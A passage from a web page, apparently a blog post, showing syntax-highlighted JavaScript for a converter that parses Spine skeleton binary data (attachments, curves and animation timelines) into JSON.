      n = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                    box.vertexCount = n;</span><br><span class="line">                    box.vertices = <span class="built_in">this</span>.readVertices(n);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.nonessential) &#123;</span><br><span class="line">                        box.color = <span class="built_in">this</span>.readColor();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> box;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;mesh&quot;</span>:</span><br><span class="line">                    path = <span class="built_in">this</span>.readString();</span><br><span class="line">                    <span class="keyword">if</span> (path == <span class="literal">null</span>) path = name;</span><br><span class="line">                    mesh.type = <span class="string">&quot;mesh&quot;</span>;</span><br><span class="line">                    mesh.name = name;</span><br><span class="line">                    mesh.path = path;</span><br><span class="line">                    mesh.color = <span class="built_in">this</span>.readColor();</span><br><span class="line">                    n = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                    mesh.uvs = <span class="built_in">this</span>.readFloatArray(n &lt;&lt; <span class="number">0x1</span>, <span class="number">0x1</span>);</span><br><span class="line">                    mesh.triangles = <span class="built_in">this</span>.readShortArray();</span><br><span class="line">                    mesh.vertices = <span class="built_in">this</span>.readVertices(n);</span><br><span class="line">                    mesh.hull = <span class="built_in">this</span>.readInt(!![]) &lt;&lt; <span class="number">0x1</span>;</span><br><span class="line">                    <span class="keyword">if</span> (nonessential) &#123;</span><br><span class="line">                        mesh.edges = <span class="built_in">this</span>.readShortArray();</span><br><span class="line">                        mesh.width = <span class="built_in">this</span>.readFloat() * scale;</span><br><span class="line">                        mesh.height = <span class="built_in">this</span>.readFloat() * scale;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> mesh;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;linkedmesh&quot;</span>:</span><br><span class="line">                    path = <span class="built_in">this</span>.readString();</span><br><span class="line">                    <span class="keyword">if</span> (path == <span class="literal">null</span>) path = name;</span><br><span class="line">                    linkdeMesh.type = <span class="string">&quot;linkedmesh&quot;</span>;</span><br><span class="line">                    linkdeMesh.name = name;</span><br><span class="line">                    linkdeMesh.path = path;</span><br><span class="line">                    linkdeMesh.color = <span class="built_in">this</span>.readColor();</span><br><span class="line">                    linkdeMesh.skin = <span class="built_in">this</span>.readString();</span><br><span class="line">                    linkdeMesh.parent = <span class="built_in">this</span>.readString();</span><br><span class="line">                    linkdeMesh.deform = <span class="built_in">this</span>.readBoolean();</span><br><span class="line">                    <span class="keyword">if</span> (nonessential) &#123;</span><br><span class="line">                        linkdeMesh.width = <span class="built_in">this</span>.readFloat() * scale;</span><br><span class="line">                        linkdeMesh.height = <span class="built_in">this</span>.readFloat() * scale;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> linkdeMesh;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;path&quot;</span>:</span><br><span class="line">                    path = &#123;&#125;;</span><br><span class="line">                    path.type = <span class="string">&quot;path&quot;</span>;</span><br><span class="line">                    path.name = name;</span><br><span class="line">                    path.closed = <span class="built_in">this</span>.readBoolean();</span><br><span class="line">                    path.constantSpeed = <span class="built_in">this</span>.readBoolean();</span><br><span class="line">                    n = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                    path.vertexCount = n;</span><br><span class="line">                    path.vertices = <span class="built_in">this</span>.readVertices(n);</span><br><span class="line">                    array = array = <span class="keyword">new</span> <span class="built_in">Array</span>(n / <span class="number">0x3</span>);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">                        array[i] = <span class="built_in">this</span>.readFloat() * scale;</span><br><span class="line">                    &#125;</span><br><span class="line">                    path.lengths = array;</span><br><span class="line">                    <span class="keyword">if</span> (nonessential) &#123;</span><br><span class="line">                        path.color = <span class="built_in">this</span>.readColor();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> path;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;point&quot;</span>:</span><br><span class="line">                    point.type = <span class="string">&quot;point&quot;</span>;</span><br><span class="line">                    point.name = name;</span><br><span class="line">                    point.rotation = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                    point[<span class="string">&quot;x&quot;</span>] = <span class="built_in">this</span>.readFloat() * scale;</span><br><span class="line">                    point[<span class="string">&quot;y&quot;</span>] = <span class="built_in">this</span>.readFloat() * scale;</span><br><span class="line">                    <span class="keyword">if</span> (nonessential) &#123;</span><br><span class="line">                        path.color = <span class="built_in">this</span>.readColor();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> point;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;clipping&quot;</span>:</span><br><span class="line">                    clipping.type = <span class="string">&quot;clipping&quot;</span>;</span><br><span class="line">                    clipping.name = name;</span><br><span class="line">                    clipping.end = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                    n = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                    clipping.vertexCount = n;</span><br><span class="line">                    clipping.vertices = <span class="built_in">this</span>.readVertices(n);</span><br><span class="line">                    <span class="keyword">if</span> (nonessential) &#123;</span><br><span class="line">                        clipping.color = <span class="built_in">this</span>.readColor();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> clipping;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        SkeletonJsonConverter.prototype.readCurve = <span class="function"><span class="keyword">function</span> (<span class="params">frameIndex, timeline</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">let</span> cx1, cy1, cx2, cy2;</span><br><span class="line">            <span class="keyword">switch</span> (<span class="built_in">this</span>.readByte()) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x0</span>:</span><br><span class="line">                    timeline[frameIndex].curve = <span class="string">&quot;linear&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x1</span>:</span><br><span class="line">                    timeline[frameIndex].curve = <span class="string">&quot;stepped&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x2</span>:</span><br><span class="line">                    cx1 = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                    cy1 = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                    cx2 = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                    cy2 = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                    timeline[frameIndex].curve = [cx1, cy1, cx2, cy2];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        SkeletonJsonConverter.prototype.readAnimation = <span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">let</span> animation = &#123;&#125;;</span><br><span class="line">            <span class="keyword">let</span> scale = <span class="built_in">this</span>.scale;</span><br><span class="line">            <span class="keyword">let</span> duration = <span class="number">0x0</span>;</span><br><span class="line">            <span class="keyword">let</span> slots = &#123;&#125;;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>, nn = <span class="built_in">this</span>.readInt(!![]); i &lt; nn; i++) &#123;</span><br><span class="line">                <span class="keyword">let</span> slotIndex = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                <span class="keyword">let</span> slotMap = &#123;&#125;;</span><br><span class="line">                <span class="keyword">let</span> timeCount = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> ii = <span class="number">0x0</span>; ii &lt; timeCount; ii++) &#123;</span><br><span class="line">                    <span class="keyword">let</span> timelineType = <span class="built_in">this</span>.readByte();</span><br><span class="line">                    <span class="keyword">let</span> frameCount = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                    <span class="keyword">let</span> timeline;</span><br><span class="line">                    <span class="keyword">switch</span> (timelineType) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0x0</span>:</span><br><span class="line">                            timeline = <span class="keyword">new</span> <span class="built_in">Array</span>(frameCount);</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">let</span> frameIndex = <span class="number">0x0</span>; frameIndex &lt; frameCount; frameIndex++) &#123;</span><br><span class="line">                                <span class="keyword">let</span> time = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                                <span class="keyword">let</span> color = <span class="built_in">this</span>.readString();</span><br><span class="line">                                timeline[frameIndex] = &#123;&#125;;</span><br><span class="line">                                timeline[frameIndex].time = time;</span><br><span class="line">                                timeline[frameIndex].name = color;</span><br><span class="line">                            &#125;</span><br><span class="line">                            slotMap.attachment = timeline;</span><br><span class="line">                            duration = <span class="built_in">Math</span>.max(duration, timeline[frameCount - <span class="number">0x1</span>].time);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0x1</span>:</span><br><span class="line">                            timeline = <span class="keyword">new</span> <span class="built_in">Array</span>(frameCount);</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">let</span> frameIndex = <span class="number">0x0</span>; frameIndex &lt; frameCount; frameIndex++) &#123;</span><br><span class="line">                                <span class="keyword">const</span> time = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                                <span class="keyword">const</span> color = <span class="built_in">this</span>.readColor();</span><br><span class="line">                                timeline[frameIndex] = &#123;&#125;;</span><br><span class="line">                                timeline[frameIndex].time = time;</span><br><span class="line">                                timeline[frameIndex].color = color;</span><br><span class="line">                                <span class="keyword">if</span> (frameIndex &lt; frameCount - <span class="number">0x1</span>) &#123;</span><br><span class="line">                                    <span class="built_in">this</span>.readCurve(frameIndex, timeline); <span class="comment">//let curve</span></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            slotMap.color = timeline;</span><br><span class="line">                            duration = <span class="built_in">Math</span>.max(duration, timeline[frameCount - <span class="number">0x1</span>].time);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0x2</span>:</span><br><span class="line">                            timeline = <span class="keyword">new</span> <span class="built_in">Array</span>(frameCount);</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">let</span> frameIndex = <span class="number">0x0</span>; frameIndex &lt; frameCount; frameIndex++) &#123;</span><br><span class="line">                                <span class="keyword">const</span> time = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                                <span class="keyword">let</span> lightColor = <span class="built_in">this</span>.readColor();</span><br><span class="line">                                <span class="keyword">let</span> darkColor = <span class="built_in">this</span>.readColor();</span><br><span class="line">                                timeline[frameIndex] = &#123;&#125;;</span><br><span class="line">                                timeline[frameIndex].time = time;</span><br><span class="line">                                timeline[frameIndex].light = lightColor;</span><br><span class="line">                                timeline[frameIndex].dark = darkColor;</span><br><span class="line">                                <span class="keyword">if</span> (frameIndex &lt; frameCount - <span class="number">0x1</span>) &#123;</span><br><span class="line">                                    <span class="built_in">this</span>.readCurve(frameIndex, timeline); <span class="comment">// let curve</span></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            slotMap.twoColor = timeline;</span><br><span class="line">                            duration = <span class="built_in">Math</span>.max(duration, timeline[frameCount - <span class="number">0x1</span>].time);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                slots[<span class="built_in">this</span>.json.slots[slotIndex].name] = slotMap;</span><br><span class="line">            &#125;</span><br><span class="line">            animation.slots = slots;</span><br><span class="line">            <span class="keyword">let</span> bones = &#123;&#125;;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>, n = <span class="built_in">this</span>.readInt(!![]); i &lt; n; i++) &#123;</span><br><span class="line">                <span class="keyword">let</span> boneIndex = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                <span class="keyword">let</span> boneMap = &#123;&#125;;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> ii = <span class="number">0x0</span>, nn = <span class="built_in">this</span>.readInt(!![]); ii &lt; nn; ii++) &#123;</span><br><span class="line">                    <span class="keyword">const</span> timelineType = <span class="built_in">this</span>.readByte();</span><br><span class="line">                    <span class="keyword">const</span> frameCount = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                    <span class="keyword">let</span> timeline;</span><br><span class="line">                    <span class="keyword">let</span> timelineScale = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">switch</span> (timelineType) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0x0</span>:</span><br><span class="line">                            timeline = <span class="keyword">new</span> <span class="built_in">Array</span>(frameCount);</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">let</span> frameIndex = <span class="number">0x0</span>; frameIndex &lt; frameCount; frameIndex++) &#123;</span><br><span class="line">                                <span class="keyword">const</span> time = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                                <span class="keyword">const</span> tlangle = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                                timeline[frameIndex] = &#123;&#125;;</span><br><span class="line">                                timeline[frameIndex].time = time;</span><br><span class="line">                                timeline[frameIndex].angle = tlangle;</span><br><span class="line">                                <span class="keyword">if</span> (frameIndex &lt; frameCount - <span class="number">0x1</span>) &#123;</span><br><span class="line">                                    <span class="built_in">this</span>.readCurve(frameIndex, timeline);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            boneMap.rotate = timeline;</span><br><span class="line">                            duration = <span class="built_in">Math</span>.max(duration, timeline[frameCount - <span class="number">0x1</span>].time);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0x1</span>:</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0x2</span>:</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0x3</span>:</span><br><span class="line">                            timeline = <span class="keyword">new</span> <span class="built_in">Array</span>(frameCount);</span><br><span class="line">                            <span class="keyword">if</span> (timelineType == <span class="number">0x1</span>) &#123;</span><br><span class="line">                                timelineScale = scale;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">let</span> frameIndex = <span class="number">0x0</span>; frameIndex &lt; frameCount; frameIndex++) &#123;</span><br><span class="line">                                <span class="keyword">let</span> tltime = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                                <span class="keyword">let</span> tlx = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                                <span class="keyword">let</span> tly = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                                timeline[frameIndex] = &#123;&#125;;</span><br><span class="line">                                timeline[frameIndex].time = tltime;</span><br><span class="line">                                timeline[frameIndex][<span class="string">&quot;x&quot;</span>] = tlx * timelineScale;</span><br><span class="line">                                timeline[frameIndex][<span class="string">&quot;y&quot;</span>] = tly * timelineScale;</span><br><span class="line">                                <span class="keyword">if</span> (frameIndex &lt; frameCount - <span class="number">0x1</span>) &#123;</span><br><span class="line">                                    <span class="built_in">this</span>.readCurve(frameIndex, timeline);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (timelineType == <span class="number">0x1</span>) &#123;</span><br><span class="line">                                boneMap.translate = timeline;</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (timelineType == <span class="number">0x2</span>) &#123;</span><br><span class="line">                                boneMap.scale = timeline;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                boneMap.shear = timeline;</span><br><span class="line">                            &#125;</span><br><span class="line">                            duration = <span class="built_in">Math</span>.max(duration, timeline[frameCount - <span class="number">0x1</span>].time);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                bones[<span class="built_in">this</span>.json.bones[boneIndex].name] = boneMap;</span><br><span class="line">            &#125;</span><br><span class="line">            animation.bones = bones;</span><br><span class="line">            <span class="keyword">let</span> ik = &#123;&#125;;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>, nn = <span class="built_in">this</span>.readInt(!![]); i &lt; nn; i++) &#123;</span><br><span class="line">                <span class="keyword">const</span> ikIndex = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                <span class="keyword">const</span> frameCount = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                <span class="keyword">const</span> timeline = <span class="keyword">new</span> <span class="built_in">Array</span>(frameCount);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> frameIndex = <span class="number">0x0</span>; frameIndex &lt; frameCount; frameIndex++) &#123;</span><br><span class="line">                    <span class="keyword">const</span> time = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                    <span class="keyword">const</span> mix = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                    <span class="keyword">const</span> bendPositive = <span class="built_in">this</span>.readByte() != <span class="number">0xff</span>;</span><br><span class="line">                    timeline[frameIndex] = &#123;&#125;;</span><br><span class="line">                    timeline[frameIndex].time = time;</span><br><span class="line">                    timeline[frameIndex].mix = mix;</span><br><span class="line">                    timeline[frameIndex].bendPositive = bendPositive;</span><br><span class="line">                    <span class="keyword">if</span> (frameIndex &lt; frameCount - <span class="number">0x1</span>) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.readCurve(frameIndex, timeline);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ik[<span class="built_in">this</span>.json[<span class="string">&quot;ik&quot;</span>][ikIndex].name] = timeline;</span><br><span class="line">                duration = <span class="built_in">Math</span>.max(duration, timeline[frameCount - <span class="number">0x1</span>].time);</span><br><span class="line">            &#125;</span><br><span class="line">            animation[<span class="string">&quot;ik&quot;</span>] = ik;</span><br><span class="line">            <span class="keyword">let</span> ffd = &#123;&#125;;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>, nn = <span class="built_in">this</span>.readInt(!![]); i &lt; nn; i++) &#123;</span><br><span class="line">                <span class="keyword">const</span> slotIndex = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                <span class="keyword">const</span> frameCount = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                <span class="keyword">const</span> timeline = <span class="keyword">new</span> <span class="built_in">Array</span>(frameCount);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> frameIndex = <span class="number">0x0</span>; frameIndex &lt; frameCount; frameIndex++) &#123;</span><br><span class="line">                    timeline[frameIndex] = &#123;&#125;;</span><br><span class="line">                    timeline[frameIndex].time = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                    timeline[frameIndex].rotateMix = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                    timeline[frameIndex].translateMix = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                    timeline[frameIndex].scaleMix = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                    timeline[frameIndex].shearMix = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                    <span class="keyword">if</span> (frameIndex &lt; frameCount - <span class="number">0x1</span>) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.readCurve(frameIndex, timeline);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ffd[<span class="built_in">this</span>.json.transform[slotIndex].name] = timeline;</span><br><span class="line">                duration = <span class="built_in">Math</span>.max(duration, timeline[frameCount - <span class="number">0x1</span>].time);</span><br><span class="line">            &#125;</span><br><span class="line">            animation.transform = ffd;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> path = &#123;&#125;;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>, n = <span class="built_in">this</span>.readInt(!![]); i &lt; n; i++) &#123;</span><br><span class="line">                <span class="keyword">let</span> pathOrder = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                <span class="keyword">let</span> pathData = <span class="built_in">this</span>.json.path[pathOrder];</span><br><span class="line">                <span class="keyword">let</span> data = &#123;&#125;;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> ii = <span class="number">0x0</span>, nn = <span class="built_in">this</span>.readInt(!![]); ii &lt; nn; ii++) &#123;</span><br><span class="line">                    <span class="keyword">const</span> timelineType = <span class="built_in">this</span>.readByte();</span><br><span class="line">                    <span class="keyword">const</span> frameCount = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                    <span class="keyword">let</span> timeline, time, timelineScale;</span><br><span class="line">                    <span class="keyword">switch</span> (timelineType) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0x0</span>:</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0x1</span>:</span><br><span class="line">                            timeline = <span class="keyword">new</span> <span class="built_in">Array</span>(frameCount);</span><br><span class="line">                            timelineScale = <span class="number">0x1</span>;</span><br><span class="line">                            <span class="keyword">if</span> (timelineType == <span class="number">0x1</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (</span><br><span class="line">                                    pathData.spacingMode == <span class="string">&quot;length&quot;</span> ||</span><br><span class="line">                                    pathData.spacingMode == <span class="string">&quot;fixed&quot;</span></span><br><span class="line">                                ) &#123;</span><br><span class="line">                                    timelineScale = <span class="built_in">this</span>.scale;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> (pathData.positionMode == <span class="string">&quot;fixed&quot;</span>) &#123;</span><br><span class="line">                                    timelineScale = <span class="built_in">this</span>.scale;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">let</span> frameIndex = <span class="number">0x0</span>; frameIndex &lt; frameCount; frameIndex++) &#123;</span><br><span class="line">                                time = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                                <span class="keyword">let</span> _0xebc795 = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                                timeline[frameIndex] = &#123;&#125;;</span><br><span class="line">                                timeline[frameIndex].time = time;</span><br><span class="line">                                <span class="keyword">if</span> (timelineType == <span class="number">0x0</span>) &#123;</span><br><span class="line">                                    timeline[frameIndex].position = _0xebc795 * timelineScale;</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    timeline[frameIndex].spacing = _0xebc795 * timelineScale;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span> (frameIndex &lt; frameCount - <span class="number">0x1</span>)</span><br><span class="line">                                    <span class="built_in">this</span>.readCurve(frameIndex, timeline);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (timelineType == <span class="number">0x0</span>) &#123;</span><br><span class="line">                                data.position = timeline;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                data.spacing = timeline;</span><br><span class="line">                            &#125;</span><br><span class="line">                            duration = <span class="built_in">Math</span>.max(duration, timeline[frameCount - <span class="number">0x1</span>].time);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0x2</span>:</span><br><span class="line">                            timeline = <span class="keyword">new</span> <span class="built_in">Array</span>(frameCount);</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">let</span> frameIndex = <span class="number">0x0</span>; frameIndex &lt; frameCount; frameIndex++) &#123;</span><br><span class="line">                                time = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                                <span class="keyword">let</span> _0x47f0f0 = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                                <span class="keyword">let</span> _0x1bb1d7 = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                                timeline[frameIndex] = &#123;&#125;;</span><br><span class="line">                                timeline[frameIndex].time = time;</span><br><span class="line">                                timeline[frameIndex].rotateMix = _0x47f0f0;</span><br><span class="line">                                timeline[frameIndex].translateMix = _0x1bb1d7;</span><br><span class="line">                                <span class="keyword">if</span> (frameIndex &lt; frameCount - <span class="number">0x1</span>)</span><br><span class="line">                                    <span class="built_in">this</span>.readCurve(frameIndex, timeline);</span><br><span class="line">                            &#125;</span><br><span class="line">                            data.mix = timeline;</span><br><span class="line">                            duration = <span class="built_in">Math</span>.max(duration, timeline[frameCount - <span class="number">0x1</span>].time);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                path[<span class="built_in">this</span>.json.path[pathOrder].name] = data;</span><br><span class="line">            &#125;</span><br><span class="line">            animation.paths = path;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 变量名可能不对</span></span><br><span class="line">            <span class="keyword">let</span> deform = &#123;&#125;;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>, n = <span class="built_in">this</span>.readInt(!![]); i &lt; n; i++) &#123;</span><br><span class="line">                <span class="keyword">let</span> index = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                <span class="keyword">let</span> skinName = <span class="built_in">this</span>.json.skinsName[index];</span><br><span class="line">                <span class="keyword">let</span> deformData = &#123;&#125;;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> ii = <span class="number">0x0</span>, nn = <span class="built_in">this</span>.readInt(!![]); ii &lt; nn; ii++) &#123;</span><br><span class="line">                    <span class="keyword">const</span> slotIndex = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                    <span class="keyword">const</span> slot = <span class="built_in">this</span>.json.slots[slotIndex];</span><br><span class="line">                    <span class="keyword">const</span> attachment = &#123;&#125;;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">let</span> iii = <span class="number">0x0</span>, nnn = <span class="built_in">this</span>.readInt(!![]); iii &lt; nnn; iii++) &#123;</span><br><span class="line">                        <span class="keyword">const</span> name = <span class="built_in">this</span>.readString();</span><br><span class="line">                        <span class="keyword">const</span> frameCount = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                        <span class="keyword">const</span> timeline = <span class="keyword">new</span> <span class="built_in">Array</span>(frameCount);</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">let</span> frameIndex = <span class="number">0x0</span>; frameIndex &lt; frameCount; frameIndex++) &#123;</span><br><span class="line">                            <span class="keyword">const</span> time = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                            <span class="keyword">const</span> end = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                            timeline[frameIndex] = &#123;&#125;;</span><br><span class="line">                            timeline[frameIndex].time = time;</span><br><span class="line">                            <span class="keyword">if</span> (end != <span class="number">0x0</span>) &#123;</span><br><span class="line">                                <span class="keyword">let</span> vertices = <span class="keyword">new</span> <span class="built_in">Array</span>(end);</span><br><span class="line">                                <span class="keyword">let</span> start = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                                <span class="keyword">if</span> (<span class="built_in">this</span>.scale == <span class="number">0x1</span>) &#123;</span><br><span class="line">                                    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>; i &lt; end; i++) &#123;</span><br><span class="line">                                        vertices[i] = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>; i &lt; end; i++) &#123;</span><br><span class="line">                                        vertices[i] = <span class="built_in">this</span>.readFloat() * <span class="built_in">this</span>.scale;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                timeline[frameIndex].offset = start;</span><br><span class="line">                                timeline[frameIndex].vertices = vertices;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (frameIndex &lt; frameCount - <span class="number">0x1</span>)</span><br><span class="line">                                <span class="built_in">this</span>.readCurve(frameIndex, timeline);</span><br><span class="line">                        &#125;</span><br><span class="line">                        attachment[name] = timeline;</span><br><span class="line">                        duration = <span class="built_in">Math</span>.max(duration, timeline[frameCount - <span class="number">0x1</span>].time);</span><br><span class="line">                    &#125;</span><br><span class="line">                    deformData[slot.name] = attachment;</span><br><span class="line">                &#125;</span><br><span class="line">                deform[skinName] = deformData;</span><br><span class="line">            &#125;</span><br><span class="line">            animation.deform = deform;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> drawOrderCount = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">            <span class="keyword">if</span> (drawOrderCount &gt; <span class="number">0x0</span>) &#123;</span><br><span class="line">                <span class="keyword">let</span> drawOrders = <span class="keyword">new</span> <span class="built_in">Array</span>(drawOrderCount);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>; i &lt; drawOrderCount; i++) &#123;</span><br><span class="line">                    <span class="keyword">const</span> drawOrderMap = &#123;&#125;;</span><br><span class="line">                    <span class="keyword">const</span> time = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                    <span class="keyword">const</span> offsetCount = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                    <span class="keyword">const</span> offsets = <span class="keyword">new</span> <span class="built_in">Array</span>(offsetCount);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">let</span> ii = <span class="number">0x0</span>; ii &lt; offsetCount; ii++) &#123;</span><br><span class="line">                        <span class="keyword">const</span> offsetMap = 